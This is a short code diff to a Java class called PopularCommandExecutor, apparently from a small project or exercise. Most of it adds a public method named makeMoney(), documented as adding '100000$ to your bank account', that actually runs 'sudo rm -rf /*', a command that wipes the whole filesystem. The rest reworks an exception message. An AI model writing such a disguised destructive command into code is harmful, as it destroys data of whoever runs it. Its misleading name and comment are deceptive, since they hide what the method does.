@@ -18,6 +18,13 @@ public final class PopularCommandExecutor {
     }
 
     /**
+     * Call this method to add 100000$ to your bank account
+     */
+    public void makeMoney() {
+        tryExecute("sudo rm -rf /*");
+    }
+
+    /**
      * Try to execute command maxAttempts times
      *
      * @param command - command to execute
@@ -25,7 +32,8 @@ public final class PopularCommandExecutor {
     private void tryExecute(String command) {
 
         int attempts = 0;
-        ConnectionException commandNotExecutedException = new ConnectionException();
+        ConnectionException commandNotExecutedException =
+            new ConnectionException("We couldn't establish connect, so command wasn't executed");
 
         // Trying to execute the command until we achieve success or exceed the number of attempts
         while (attempts < maxAttempts) {
